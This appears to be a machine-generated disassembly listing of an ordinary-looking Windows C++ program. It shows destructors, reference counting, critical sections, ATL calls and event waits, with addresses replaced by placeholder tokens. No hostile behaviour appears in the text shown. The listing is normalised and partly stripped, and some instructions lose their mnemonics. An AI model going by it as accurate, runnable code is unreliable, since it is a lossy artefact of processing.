mov [ esi ] 0x0
test [ esp + 0xc ] 0x1
mov [ esi + 0x8 ] 0x0
je r-xdata
push eax
call edi
add esp 0x4
mov [ esi + 0x4 ] 0x0
pop edi
mov eax esi
pop esi
retn 0x4
push esi
call ??3@YAXPAX@Z
add esp 0x4
sub_414b80
push 0xffffffff
push sub_431108
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi ecx
mov [ esp + 0x4 ] esi
mov [ esp + 0x10 ] 0xffffffff
mov al [ esi + 0x4 ]
test al al
je r-xdata
mov ecx [ esp + 0x8 ]
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
mov eax [ esi ]
push eax
call [ LeaveCriticalSection@IAT ]
mov [ esi + 0x4 ] 0x0
sub_414bd0
push esi
mov esi ecx
mov eax [ esi ]
test eax eax
je r-xdata
test [ esp + 0x8 ] 0x1
mov [ esi + 0x4 ] 0x0
mov [ esi + 0x8 ] 0x0
je r-xdata
push eax
call [ free@IAT ]
add esp 0x4
mov [ esi ] 0x0
mov eax esi
pop esi
retn 0x4
push esi
call ??3@YAXPAX@Z
add esp 0x4
sub_414c10
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
pop esi
retn
push eax
call [ InterlockedDecrement@IAT ]
test eax eax
jg r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
push eax
mov [ eax ] r--data
call ??3@YAXPAX@Z
add esp 0x4
mov [ esi ] 0x0
mov [ esi + 0x4 ] 0x0
push eax
call ??3@YAXPAX@Z
add esp 0x4
sub_414c80
push ebp
mov ebp [ esp + 0xc ]
push esi
mov esi [ esp + 0xc ]
cmp esi ebp
je r-xdata
pop esi
pop ebp
retn
push edi
mov edi [ esp + 0x18 ]
add esi 0x8
cmp esi ebp
jne r-xdata
cmp [ esi ] 0x0
je r-xdata
cmp esi edi
je r-xdata
pop edi
mov eax [ edi ]
mov [ esi ] eax
mov eax [ edi + 0x4 ]
test eax eax
mov [ esi + 0x4 ] eax
je r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
push eax
call [ InterlockedIncrement@IAT ]
push eax
call [ InterlockedDecrement@IAT ]
test eax eax
jg r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
push eax
mov [ eax ] r--data
call ??3@YAXPAX@Z
add esp 0x4
mov [ esi ] 0x0
mov [ esi + 0x4 ] 0x0
push eax
call ??3@YAXPAX@Z
add esp 0x4
sub_414d20
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
test [ esp + 0x8 ] 0x1
je r-xdata
push eax
call [ InterlockedDecrement@IAT ]
test eax eax
jg r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call ??3@YAXPAX@Z
add esp 0x4
mov eax [ esi ]
test eax eax
je r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
push eax
mov [ eax ] r--data
call ??3@YAXPAX@Z
add esp 0x4
mov [ esi ] 0x0
mov [ esi + 0x4 ] 0x0
push eax
call ??3@YAXPAX@Z
add esp 0x4
sub_414d80
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
pop esi
retn
push eax
call [ InterlockedDecrement@IAT ]
test eax eax
jg r-xdata
mov ecx [ esi ]
test ecx ecx
je r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov eax [ ecx ]
push 0x1
call [ eax ]
mov [ esi ] 0x0
mov [ esi + 0x4 ] 0x0
push eax
call ??3@YAXPAX@Z
add esp 0x4
sub_414dc0
push 0xffffffff
push sub_43112b
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov eax [ esp + 0x14 ]
push esi
mov esi ecx
mov ecx [ eax ]
mov eax [ esp + 0x1c ]
mov [ esi ] ecx
mov edx [ eax ]
mov [ esi + 0x4 ] edx
mov eax [ eax + 0x4 ]
test eax eax
mov [ esp + 0x4 ] esi
mov [ esi + 0x8 ] eax
je r-xdata
mov [ esp + 0x10 ] 0xffffffff
mov ecx [ esp + 0x8 ]
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn 0x8
push eax
call [ InterlockedIncrement@IAT ]
sub_414e40
push 0xffffffff
push sub_43114b
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov eax [ esp + 0x14 ]
push esi
mov esi ecx
mov ecx [ eax ]
mov [ esi ] ecx
mov edx [ eax + 0x4 ]
mov [ esi + 0x4 ] edx
mov eax [ eax + 0x8 ]
test eax eax
mov [ esp + 0x4 ] esi
mov [ esi + 0x8 ] eax
je r-xdata
mov [ esp + 0x10 ] 0xffffffff
mov ecx [ esp + 0x8 ]
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn 0x4
push eax
call [ InterlockedIncrement@IAT ]
sub_414ea0
push esi
mov esi ecx
call sub_402550
cmp [ eax ] 0x0
jne r-xdata
mov ecx [ esp + 0x18 ]
mov edx [ esp + 0x14 ]
push ecx
mov ecx [ esp + 0x14 ]
push edx
mov edx [ esp + 0x14 ]
push ecx
mov ecx [ esp + 0x14 ]
push edx
push ecx
call [ eax + 0x4 ]
xor eax eax
jmp r-xdata
xor eax eax
pop esi
retn 0x14
mov eax 0x1
mov [ esi + 0x4 ] eax
pop esi
retn 0x14
test eax eax
mov [ esi ] eax
je r-xdata
sub_414ef0
push esi
push edi
mov edi ecx
mov esi [ edi ]
test esi esi
je r-xdata
pop edi
xor eax eax
pop esi
retn
call sub_402550
cmp [ eax ] 0x0
je r-xdata
mov [ edi ] 0x0
pop edi
mov eax 0x1
pop esi
retn
push esi
call [ eax + 0x8 ]
test eax eax
jne r-xdata
sub_414f20
push esi
mov esi ecx
call sub_402550
cmp [ eax ] 0x0
jne r-xdata
mov ecx [ esp + 0x1c ]
mov edx [ esp + 0x18 ]
push ecx
mov ecx [ esp + 0x18 ]
push edx
mov edx [ esp + 0x18 ]
push ecx
mov ecx [ esp + 0x18 ]
push edx
mov edx [ esp + 0x18 ]
push ecx
push edx
call [ eax + 0xc ]
xor eax eax
jmp r-xdata
xor eax eax
pop esi
retn 0x18
mov eax 0x1
mov [ esi + 0x8 ] eax
pop esi
retn 0x18
test eax eax
mov [ esi ] eax
je r-xdata
sub_414f70
push esi
push edi
mov edi ecx
mov esi [ edi ]
test esi esi
je r-xdata
pop edi
xor eax eax
pop esi
retn
call sub_402550
cmp [ eax ] 0x0
je r-xdata
mov [ edi ] 0x0
pop edi
mov eax 0x1
pop esi
retn
push esi
call [ eax + 0x10 ]
test eax eax
jne r-xdata
sub_414fb0
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_431168
push eax
mov [ fs : 0x0 ] esp
push esi
mov esi [ esp + 0x18 ]
test esi esi
jne r-xdata
call [ rw-data ]
mov [ esp + 0x18 ] 0x0
mov [ esp + 0xc ] 0x0
mov eax [ esp + 0x20 ]
mov ecx [ esp + 0x1c ]
mov edx [ esp + 0x14 ]
push eax
push ecx
push esi
push edx
call sub_415030
mov [ esp + 0xc ] 0xffffffff
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
pop esi
add esp 0xc
retn 0x10
mov eax 0x80070057
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
pop esi
add esp 0xc
retn 0x10
sub_415030
push 0xffffffff
push sub_4311a8
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov [ esp + 0x4 ] 0x0
mov [ esp + 0x10 ] 0x1
lea eax [ esp + 0x4 ]
push eax
call [ Ordinal_ATL71_61@IAT ]
mov esi eax
test esi esi
jge r-xdata
mov esi [ esp + 0x24 ]
test esi esi
je r-xdata
jmp r-xdata
mov ecx [ esp + 0x18 ]
mov edx [ esp + 0x4 ]
mov eax [ ecx ]
push edx
call [ eax + 0x14 ]
mov esi eax
test esi esi
jge r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
mov [ esp + 0x10 ] 0xffffffff
mov eax [ esp + 0x4 ]
test eax eax
je r-xdata
mov edx [ esp + 0x4 ]
mov eax [ esp + 0x20 ]
mov ecx [ esp + 0x1c ]
push edx
mov edx [ rw-data ]
push 0x0
push eax
push ecx
push edx
call [ Ordinal_ATL71_23@IAT ]
mov esi eax
jmp r-xdata
push edi
lea esp [ esp ]
mov ecx [ esp + 0x8 ]
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn 0x10
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
mov edi [ esi + 0x4 ]
mov ecx [ esp + 0x8 ]
mov edx [ ecx ]
push edi
push eax
push ecx
call [ edx + 0xc ]
mov eax [ esi + 0x8 ]
add esi 0x8
test eax eax
jne r-xdata
pop edi
sub_415110
push 0xffffffff
push sub_4311c8
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov [ esp ] ecx
mov [ esp + 0xc ] 0xffffffff
mov eax [ ecx ]
test eax eax
je r-xdata
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
sub_415160
push 0xffffffff
push sub_43123b
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0xb8
mov eax [ rw-data ]
push ebx
push ebp
push esi
push edi
push 0x2c
mov [ esp + 0xc8 ] eax
mov ebp ecx
call j_sub_42e3bc
mov ebx eax
add esp 0x4
xor eax eax
mov ecx 0xb
mov edi ebx
[ edi ]
mov ecx [ r--data ]
mov eax ebx
mov [ eax ] ecx
mov dl [ r--data ]
mov [ eax + 0x4 ] dl
lea esi [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax esi
lea edi [ eax + ebx + 0x1 ]
mov ecx 0x9
mov esi r--data
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
movsb [ edi ] [ esi ]
mov eax [ ebp + 0x18 ]
mov ecx [ ebp + 0xc ]
mov esi [ ebp + 0x14 ]
mov edi [ ebp + 0x10 ]
lea edx [ ebp + 0x48 ]
mov [ esp + 0x2c ] eax
mov [ esp + 0x10 ] ecx
mov [ esp + 0x14 ] edx
call sub_402550
cmp [ eax ] 0x0
jne r-xdata
mov ecx [ esp + 0x2c ]
mov edx [ esp + 0x10 ]
push esi
push edi
push ecx
push edx
push 0x2b
push ebx
call [ eax + 0xc ]
xor eax eax
jmp r-xdata
mov eax [ ebp + 0xc ]
mov esi [ ebp + 0x14 ]
mov edi [ ebp + 0x10 ]
mov [ esp + 0x10 ] eax
call sub_402550
cmp [ eax ] 0x0
jne r-xdata
mov [ ecx + 0x8 ] 0x1
test eax eax
mov ecx [ esp + 0x14 ]
mov [ ecx ] eax
je r-xdata
mov ecx [ esp + 0x10 ]
push esi
push edi
push ecx
push 0x2b
push ebx
call [ eax + 0x4 ]
xor eax eax
jmp r-xdata
mov ecx [ esp + 0xc8 ]
pop edi
pop esi
pop ebp
mov [ fs : 0x0 ] ecx
mov ecx [ esp + 0xb8 ]
xor eax eax
pop ebx
call sub_42e72f
add esp 0xc4
retn
mov [ edi + 0x4 ] 0x1
mov ecx [ ebp + 0x1c ]
mov edx [ ebp + 0x54 ]
mov eax [ ebp + 0x18 ]
or ebx 0xffffffff
push ebx
mov [ esp + 0x24 ] ecx
push 0x0
lea ecx [ esp + 0x20 ]
mov [ esp + 0x20 ] edx
mov edx [ ebp + 0x14 ]
mov [ esp + 0x24 ] eax
mov eax [ ebp + 0x2cc ]
push ecx
push 0x5
mov [ esp + 0x34 ] edx
mov [ esp + 0x38 ] eax
call [ WaitForMultipleObjects@IAT ]
test eax eax
je r-xdata
test eax eax
mov edi [ esp + 0x14 ]
mov [ edi ] eax
je r-xdata
call sub_4122b0
mov ecx eax
call sub_411a00
cmp eax 0x1
jne r-xdata
mov esi [ edi ]
test esi esi
je r-xdata
call sub_402550
cmp [ eax ] 0x0
je r-xdata
cmp eax 0x2
jne r-xdata
lea ecx [ esp + 0x4c ]
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
mov [ esp + 0xd0 ] 0x0
lea ecx [ esp + 0x68 ]
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
mov [ esp + 0xd0 ] 0x1
lea esi [ ebp + 0x68 ]
mov [ esp + 0x84 ] esi
mov [ esp + 0xd0 ] 0x2
lea edx [ esp + 0x4c ]
push edx
push edi
call sub_4020b0
mov ecx eax
call sub_402ea0
test eax eax
je r-xdata
call sub_413620
call sub_402550
cmp [ eax ] 0x0
je r-xdata
mov [ edi ] 0x0
push esi
call [ eax + 0x8 ]
test eax eax
jne r-xdata
cmp eax 0x3
je r-xdata
push r--data
lea ecx [ esp + 0x34 ]
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
mov [ esp + 0xd0 ] 0x5
push 0x0
lea edx [ ebp + 0x20 ]
push edx
lea eax [ esp + 0x38 ]
push eax
lea ecx [ esp + 0x94 ]
call sub_4133e0
mov [ esp + 0xd0 ] 0x7
lea ecx [ esp + 0x30 ]
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
lea ecx [ esp + 0x88 ]
push ecx
push edi
call sub_4020b0
mov ecx eax
call sub_402f60
mov [ esp + 0xd0 ] 0x8
lea ecx [ esp + 0xa4 ]
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
mov [ esp + 0xd0 ] ebx
lea ecx [ esp + 0x88 ]
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
jmp r-xdata
mov [ esp + 0xd0 ] 0x3
lea ecx [ esp + 0x68 ]
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
or ebx 0xffffffff
mov [ esp + 0xd0 ] ebx
lea ecx [ esp + 0x4c ]
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
jmp r-xdata
mov eax [ ebp + 0x18 ]
push eax
call [ ResetEvent@IAT ]
push r--data
lea ecx [ esp + 0x50 ]
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::compare@IAT ]
test eax eax
jne r-xdata
mov [ edi ] 0x0
push esi
call [ eax + 0x10 ]
test eax eax
jne r-xdata
mov eax [ ebp + 0x60 ]
cmp eax 0x3
je r-xdata
cmp eax 0x4
je r-xdata
mov ecx [ ebp + 0x1c ]
mov edx [ ebp + 0x54 ]
mov eax [ ebp + 0x18 ]
push ebx
mov [ esp + 0x24 ] ecx
push 0x0
lea ecx [ esp + 0x20 ]
mov [ esp + 0x20 ] edx
mov edx [ ebp + 0x14 ]
mov [ esp + 0x24 ] eax
mov eax [ ebp + 0x2cc ]
push ecx
push 0x5
mov [ esp + 0x34 ] edx
mov [ esp + 0x38 ] eax
call [ WaitForMultipleObjects@IAT ]
test eax eax
jne r-xdata
push r--data
lea ecx [ esp + 0x50 ]
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::compare@IAT ]
test eax eax
jne r-xdata
mov edx [ rw-data ]
mov eax [ rw-data ]
xor ecx ecx
mov cl [ rw-data ]
push ecx
mov ecx [ ebp + 0x78 ]
push edx
push eax
push ecx
push 0x0
push 0xe
call sub_414860
mov eax [ ebp + 0x70 ]
add esp 0x18
cmp eax 0x3
mov [ ebp + 0x60 ] eax
je r-xdata
lea ecx [ ebp + 0xb8 ]
call sub_408720
cmp eax 0x4
je r-xdata
cmp eax 0x84
je r-xdata
jmp r-xdata
mov eax [ ebp + 0x60 ]
cmp eax 0x3
je r-xdata
lea ebx [ ebp + 0xb8 ]
push esi
mov ecx ebx
call sub_4131d0
mov ecx ebx
call sub_408a70
jmp r-xdata
cmp eax 0x4
je r-xdata
cmp eax 0x5
jne r-xdata
lea ecx [ ebp + 0xb8 ]
call sub_408720
cmp eax 0x4
je r-xdata
cmp eax 0x5
push esi
jne r-xdata
lea ecx [ ebp + 0x134 ]
call sub_40de30
jmp r-xdata
lea ecx [ ebp + 0x25c ]
call sub_4170b0
jmp r-xdata
mov esi [ edi ]
test esi esi
je r-xdata
cmp eax 0x5
jne r-xdata
lea ecx [ ebp + 0x148 ]
call sub_413e50
lea ecx [ ebp + 0x134 ]
call sub_40e1b0
jmp r-xdata
lea ebx [ ebp + 0x25c ]
mov ecx ebx
call sub_413220
mov ecx ebx
call sub_417490
jmp r-xdata
mov eax [ rw-data ]
mov ecx [ rw-data ]
xor edx edx
mov dl [ rw-data ]
push edx
push eax
push ecx
push 0x0
push 0x0
push 0x5
call sub_414860
add esp 0x18
lea ecx [ ebp + 0x134 ]
call sub_40de30
jmp r-xdata
lea ecx [ ebp + 0x25c ]
call sub_4170b0
jmp r-xdata
mov eax [ rw-data ]
mov ecx [ rw-data ]
xor edx edx
mov dl [ rw-data ]
push edx
push eax
push ecx
push 0x0
push 0x0
push 0x4
call sub_414860
add esp 0x18
call sub_4122b0
mov ecx eax
call sub_411a00
mov [ esp + 0xd0 ] ebx
lea ecx [ esp + 0x4c ]
call sub_413690
jmp r-xdata
sub_415630
push esi
mov esi [ esp + 0x8 ]
test esi esi
je r-xdata
mov eax [ esi + 0x58 ]
push eax
call [ SetEvent@IAT ]
push 0xffffffff
call [ Sleep@IAT ]
xor eax eax
pop esi
retn 0x4
mov ecx esi
call sub_415160
sub_415660
push 0xffffffff
push sub_431260
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x8
mov eax [ rw-data ]
push ebx
add eax 0x10
xor ebx ebx
push edi
mov edi ecx
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] bl
mov [ esp + 0x18 ] 0x1
mov eax [ esp + 0x8 ]
push eax
call [ EnterCriticalSection@IAT ]
mov eax [ edi + 0x38 ]
cmp eax ebx
mov [ esp + 0xc ] 0x1
je r-xdata
push esi
mov esi [ edi + 0x38 ]
cmp esi ebx
je r-xdata
mov ecx [ eax + 0x4 ]
cmp ecx ebx
jle r-xdata
mov edx [ esp + 0xc ]
push edx
mov [ edi + 0x38 ] ebx
call [ LeaveCriticalSection@IAT ]
mov [ esp + 0x10 ] bl
mov [ esp + 0x1c ] 0xffffffff
lea ecx [ esp + 0xc ]
call sub_414b80
mov ecx [ esp + 0x14 ]
pop esi
pop edi
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x14
retn
mov eax [ esi ]
cmp eax ebx
je r-xdata
cmp ecx ebx
jg r-xdata
push esi
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] ebx
call ??3@YAXPAX@Z
add esp 0x4
push eax
call [ free@IAT ]
add esp 0x4
mov [ esi ] ebx
mov eax [ eax ]
mov ecx [ eax ]
push ecx
call [ DestroyWindow@IAT ]
push ebx
push ebx
push 0x1
push 0xc000008c
call [ RaiseException@IAT ]
sub_415730
push esi
mov esi [ esp + 0x8 ]
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
pop esi
retn
push eax
call [ InterlockedDecrement@IAT ]
test eax eax
jg r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
push eax
mov [ eax ] r--data
call ??3@YAXPAX@Z
add esp 0x4
mov [ esi ] 0x0
mov [ esi + 0x4 ] 0x0
push eax
call ??3@YAXPAX@Z
add esp 0x4
sub_415780
push 0xffffffff
push sub_43127b
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi ecx
mov [ esp + 0x4 ] esi
mov [ esp + 0x10 ] 0xffffffff
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
mov ecx [ esp + 0x8 ]
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
push eax
call [ InterlockedDecrement@IAT ]
test eax eax
jg r-xdata
mov ecx [ esi + 0x4 ]
test ecx ecx
je r-xdata
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
mov eax [ ecx ]
push 0x1
call [ eax ]
mov [ esi + 0x4 ] 0x0
mov [ esi + 0x8 ] 0x0
push eax
call ??3@YAXPAX@Z
add esp 0x4
sub_415800
push 0xffffffff
push sub_43129b
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov eax [ esp + 0x14 ]
mov edx [ esp + 0x1c ]
push esi
mov esi ecx
mov ecx [ esp + 0x1c ]
mov [ esi ] eax
mov eax [ esp + 0x24 ]
mov [ esi + 0x4 ] ecx
push eax
lea ecx [ esi + 0xc ]
mov [ esp + 0x8 ] esi
mov [ esi + 0x8 ] edx
call sub_414e40
xor eax eax
mov [ esp + 0x10 ] eax
mov cl [ esp + 0x28 ]
mov [ esi + 0x18 ] cl
mov [ esi + 0x19 ] al
mov [ esp + 0x10 ] 0xffffffff
mov ecx [ esp + 0x8 ]
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn 0x14
sub_415870
push esi
push edi
mov edi ecx
mov eax [ edi + 0x4 ]
test eax eax
mov esi [ edi ]
je r-xdata
test esi esi
je r-xdata
test esi esi
je r-xdata
pop edi
pop esi
retn
call sub_402550
cmp [ eax ] 0x0
je r-xdata
call sub_402550
cmp [ eax ] 0x0
je r-xdata
mov [ edi ] 0x0
push esi
call [ eax + 0x10 ]
push esi
call [ eax + 0x8 ]
jmp r-xdata
test eax eax
jne r-xdata
sub_4158b0
push 0xffffffff
push sub_43130f
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi ecx
push edi
xor edi edi
mov [ esp + 0x8 ] esi
mov [ esi ] edi
mov [ esi + 0x4 ] edi
mov [ esp + 0x14 ] edi
lea ecx [ esi + 0x20 ]
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
mov [ esp + 0x14 ] 0x1
mov [ esi + 0x3c ] edi
mov [ esi + 0x40 ] edi
mov [ esi + 0x44 ] edi
mov [ esp + 0x14 ] 0x2
mov [ esi + 0x48 ] edi
mov [ esi + 0x4c ] edi
mov [ esi + 0x50 ] edi
mov [ esp + 0x14 ] 0x3
lea ecx [ esi + 0x68 ]
call sub_408530
mov [ esp + 0x14 ] 0x4
lea ecx [ esi + 0xb8 ]
call sub_4087c0
mov [ esp + 0x14 ] 0x5
lea ecx [ esi + 0x134 ]
call sub_40dc90
mov [ esp + 0x14 ] 0x6
lea ecx [ esi + 0x25c ]
call sub_417110
mov [ esp + 0x14 ] 0x7
mov [ esi + 0x8 ] edi
mov [ esi + 0xc ] edi
mov [ esi + 0x18 ] edi
mov [ esi + 0x1c ] edi
mov [ esi + 0x10 ] edi
mov [ esi + 0x14 ] edi
mov [ esi + 0x58 ] edi
mov [ esi + 0x5c ] edi
mov [ esi + 0x60 ] edi
mov [ esi + 0x2cc ] edi
mov [ esp + 0x14 ] 0xffffffff
mov ecx [ esp + 0xc ]
pop edi
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_415980
push 0xffffffff
push sub_43137f
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push ebx
push esi
mov esi ecx
push edi
mov [ esp + 0xc ] esi
mov [ esp + 0x18 ] 0x6
lea ecx [ esi + 0x25c ]
call sub_417050
mov [ esp + 0x18 ] 0x5
lea ecx [ esi + 0x134 ]
call sub_40dcf0
mov [ esp + 0x18 ] 0x4
lea ecx [ esi + 0xb8 ]
call sub_4086b0
mov [ esp + 0x18 ] 0x3
lea ecx [ esi + 0x68 ]
call sub_408660
mov [ esp + 0x18 ] 0x2
mov eax [ esi + 0x4c ]
mov edi [ esi + 0x48 ]
xor ebx ebx
cmp eax ebx
je r-xdata
cmp edi ebx
je r-xdata
cmp edi ebx
je r-xdata
mov [ esp + 0x18 ] 0x1
cmp [ esi + 0x40 ] ebx
mov edi [ esi + 0x3c ]
je r-xdata
call sub_402550
cmp [ eax ] ebx
je r-xdata
call sub_402550
cmp [ eax ] ebx
je r-xdata
cmp edi ebx
je r-xdata
cmp edi ebx
je r-xdata
mov [ esi + 0x48 ] ebx
push edi
call [ eax + 0x10 ]
push edi
call [ eax + 0x8 ]
jmp r-xdata
mov [ esp + 0x18 ] bl
lea ecx [ esi + 0x20 ]
call [ std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >::~basic_string<wchar_t,struct std::char_traits<wchar_t>,class std::allocator<wchar_t> >@IAT ]
mov [ esp + 0x18 ] 0xffffffff
mov eax [ esi + 0x4 ]
cmp eax ebx
je r-xdata
call sub_402550
cmp [ eax ] ebx
je r-xdata
call sub_402550
cmp [ eax ] ebx
je r-xdata
cmp eax ebx
jne r-xdata
mov ecx [ esp + 0x10 ]
pop edi
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
push eax
call [ InterlockedDecrement@IAT ]
test eax eax
jg r-xdata
mov [ esi + 0x3c ] ebx
push edi
call [ eax + 0x10 ]
push edi
call [ eax + 0x8 ]
jmp r-xdata
mov ecx [ esi ]
cmp ecx ebx
je r-xdata
cmp eax ebx
jne r-xdata
mov eax [ esi + 0x4 ]
cmp eax ebx
je r-xdata
mov eax [ ecx ]
push 0x1
call [ eax ]
mov [ esi ] ebx
mov [ esi + 0x4 ] ebx
push eax
call ??3@YAXPAX@Z
add esp 0x4
sub_415ab0
push ebp
push esi
mov ebp ecx
call sub_415660
mov esi [ ebp + 0x34 ]
test esi esi
je r-xdata
pop esi
mov ecx ebp
pop ebp
jmp sub_4134d0
mov eax [ esi ]
test eax eax
push edi
mov edi [ free@IAT ]
je r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
push eax
call edi
add esp 0x4
mov [ esi ] 0x0
push esi
mov [ esi + 0x8 ] 0x0
call ??3@YAXPAX@Z
add esp 0x4
pop edi
push eax
call edi
add esp 0x4
mov [ esi + 0x4 ] 0x0
sub_415b10
push esi
mov esi [ esp + 0x8 ]
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
pop esi
retn 0x4
push eax
call [ InterlockedDecrement@IAT ]
test eax eax
jg r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
push eax
mov [ eax ] r--data
call ??3@YAXPAX@Z
add esp 0x4
mov [ esi ] 0x0
mov [ esi + 0x4 ] 0x0
push eax
call ??3@YAXPAX@Z
add esp 0x4
sub_415b60
push ebp
mov ebp esp
push 0xffffffff
push sub_431390
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x8
push ebx
push esi
push edi
mov [ ebp - 0x10 ] esp
mov edi [ ebp + 0x10 ]
mov [ ebp - 0x14 ] edi
mov [ ebp - 0x4 ] 0x0
mov ebx [ ebp + 0x14 ]
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0xffffffff
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push esi
push edi
mov ecx ebx
call sub_414480
add edi 0x8
mov [ ebp + 0x10 ] edi
add esi 0x8
mov [ ebp + 0x8 ] esi
jmp r-xdata
cmp esi [ ebp + 0xc ]
je r-xdata
sub_415bca
mov esi [ ebp - 0x14 ]
mov edi [ ebp + 0x10 ]
cmp esi edi
je r-xdata
push 0x0
push 0x0
call _CxxThrowException
mov ebx [ ebp + 0x14 ]
push esi
mov ecx ebx
call sub_415b10
add esi 0x8
cmp esi edi
jne r-xdata
sub_415bf0
push ebp
mov ebp esp
push 0xffffffff
push sub_4313b1
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x10
push ebx
push esi
push edi
mov [ ebp - 0x10 ] esp
push 0x1c
call sub_42e3bc
add esp 0x4
mov esi eax
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x4 ] 0x1
test esi esi
je r-xdata
xor eax eax
mov eax [ ebp + 0x18 ]
push eax
mov ecx [ ebp + 0x14 ]
push ecx
mov edx [ ebp + 0x10 ]
push edx
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
mov ecx esi
call sub_415800
jmp r-xdata
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x4 ] 0xffffffff
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
